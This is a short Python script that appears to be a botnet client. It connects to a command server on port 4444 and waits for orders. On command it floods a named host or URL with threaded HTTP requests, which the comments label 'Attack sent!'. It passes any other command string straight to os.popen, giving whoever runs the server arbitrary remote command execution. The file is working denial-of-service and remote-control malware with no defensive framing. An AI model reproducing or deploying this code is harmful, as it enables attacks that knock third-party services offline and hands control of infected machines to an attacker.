import threading
import requests
import socket
import time
import os

host = "127.0.0.1"
port = 4444


def client():
    try:
        c = socket.socket()
        c.connect((host, port))

        while 1:
            data = c.recv(1024).decode()

            if data == "ping":
                c.send("pong".encode())

            elif data.startswith("socket"):
                data = data.split()

                s_ip = socket.gethostbyname(data[1])
                s_port = int(data[2])
                s_byte = int(data[3])

                data = ' '.join(data)

                sock = socket.socket()
                sock.connect((s_ip, s_port))

                def s_send():
                    request = f"GET / HTTP/1.1\r\nHost: {s_ip}\r\n\r\n"
                    sock.sendall(request.encode())

                    # if sock.recv(1024):
                    # print(f"\033[32m[+]\033[0m Attack sent!")

                for i in range(s_byte):
                    thread = threading.Thread(target=s_send)
                    thread.start()

            elif data.startswith("request"):
                data = data.split()

                r_url = data[1]
                r_byte = int(data[2])

                data = ' '.join(data)

                def r_send():
                    response = requests.get(r_url)

                    # if response.status_code == 200:
                    # print(f"\033[32m[+]\033[0m Attack sent!")

                for i in range(r_byte):
                    thread = threading.Thread(target=r_send)
                    thread.start()

            else:
                os.popen(data)

    except socket.error as err:
        # print(err)
        time.sleep(1)
        client()


client()
